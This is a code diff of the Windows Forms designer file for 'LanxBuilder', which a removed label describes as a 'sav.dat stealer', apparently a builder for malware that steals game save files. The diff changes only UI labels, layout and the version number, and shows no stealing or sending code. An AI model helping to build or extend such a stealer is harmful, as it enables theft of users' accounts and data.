@@ -1,4 +1,4 @@
-﻿namespace lanx1337
+namespace lanx1337
 {
     partial class Form1
     {
@@ -77,7 +77,6 @@
             this.label15 = new System.Windows.Forms.Label();
             this.label1 = new System.Windows.Forms.Label();
             this.label13 = new System.Windows.Forms.Label();
-            this.label16 = new System.Windows.Forms.Label();
             this.timer1 = new System.Windows.Forms.Timer(this.components);
             this.lanxhax = new System.Windows.Forms.Label();
             this.groupBox1.SuspendLayout();
@@ -558,11 +557,11 @@
             this.label14.Cursor = System.Windows.Forms.Cursors.Hand;
             this.label14.Font = new System.Drawing.Font("Microsoft Sans Serif", 15F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.label14.ForeColor = System.Drawing.Color.White;
-            this.label14.Location = new System.Drawing.Point(3, 10);
+            this.label14.Location = new System.Drawing.Point(54, 10);
             this.label14.Name = "label14";
-            this.label14.Size = new System.Drawing.Size(276, 25);
+            this.label14.Size = new System.Drawing.Size(181, 25);
             this.label14.TabIndex = 2;
-            this.label14.Text = "Join discord server of srmotion";
+            this.label14.Text = "Join discord server ";
             this.label14.Click += new System.EventHandler(this.label14_Click);
             // 
             // panel2
@@ -611,18 +610,6 @@
             this.label13.Text = "Subscribe to my channel";
             this.label13.Click += new System.EventHandler(this.label13_Click);
             // 
-            // label16
-            // 
-            this.label16.AutoSize = true;
-            this.label16.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.label16.Location = new System.Drawing.Point(628, 13);
-            this.label16.Name = "label16";
-            this.label16.Size = new System.Drawing.Size(302, 90);
-            this.label16.TabIndex = 2;
-            this.label16.Text = "This sav.dat stealer is made by Lanx GT\r\nthe reason why i made it open source is " +
-    "the\r\nsource was already leaked so and i was tired\r\nof updating this program i am" +
-    " busy with \r\nskool etc";
-            // 
             // timer1
             // 
             this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
@@ -645,7 +632,6 @@
             this.BackColor = System.Drawing.Color.Gray;
             this.ClientSize = new System.Drawing.Size(935, 546);
             this.Controls.Add(this.lanxhax);
-            this.Controls.Add(this.label16);
             this.Controls.Add(this.panel2);
             this.Controls.Add(this.panel1);
             this.Controls.Add(this.groupBox3);
@@ -657,7 +643,7 @@
             this.Name = "Form1";
             this.Opacity = 0.9D;
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "LanxBuilder [open source] v1.3";
+            this.Text = "LanxBuilder [open source] v1.4";
             this.Load += new System.EventHandler(this.Form1_Load);
             this.groupBox1.ResumeLayout(false);
             this.groupBox1.PerformLayout();
@@ -730,7 +716,6 @@
         private System.Windows.Forms.Label label13;
         private System.Windows.Forms.Label label14;
         private System.Windows.Forms.Label label15;
-        private System.Windows.Forms.Label label16;
         private System.Windows.Forms.Timer timer1;
         private System.Windows.Forms.Label lanxhax;
     }
